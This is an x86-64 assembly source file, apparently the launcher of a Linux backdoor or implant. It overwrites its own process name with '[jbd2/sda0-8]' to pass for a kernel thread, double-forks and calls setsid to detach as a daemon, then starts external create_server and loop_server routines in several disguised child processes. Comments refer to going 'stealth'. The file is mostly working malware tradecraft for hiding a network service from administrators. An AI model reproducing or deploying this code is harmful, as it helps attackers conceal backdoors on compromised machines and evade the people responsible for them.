BITS 64

section .data
    timeval:
        tv_sec  dd 0
        tv_usec dd 0

section .rodata
    pname: db "[jbd2/sda0-8]", 0

section .text
    global _start
    extern create_server
    extern loop_server

strcpy:
    mov     al, [rsi]
    mov     [rdi], al
    mov     bl, [rsi]
    cmp     bl, 0
    je      end_strcpy
    inc     rdi
    inc     rsi
    jmp     strcpy
end_strcpy:
    ret

_start:
    push    rbp
    mov     rbp, rsp
    mov     rdi, [rbp + 0x10]
    lea     rsi, [rel pname]
    call    strcpy
    ; don't go stealth while it crashes :p
    xor     eax, eax
    add     eax, 0x39 ; fork
    syscall
    cmp     rax, 0
    jne     exit
    xor     eax, eax
    add     eax, 0x70 ; setsid
    syscall
    xor     eax, eax
    add     eax, 0x39 ; fork
    syscall
    cmp     eax, 0
    jne     exit
    call    create_server
; don't fork when it crashes :)
    xor     eax, eax
    add     eax, 0x39 ; fork
    syscall
    cmp     eax, 0
    jne     fork2
    mov     rax, [rbp + 0x10]
    mov     BYTE [rax + 0xb], 54
    jmp     connect
fork2:
    xor     eax, eax
    add     eax, 0x39 ; fork
    syscall
    cmp     eax, 0
    jne     connect
    mov     rax, [rbp + 0x10]
    mov     BYTE [rax + 0xb], 55
connect:
    call    loop_server

exit:
    xor     rdi, rdi
    xor     eax, eax
    add     eax, 0x3c ; exit
    syscall
    ret 
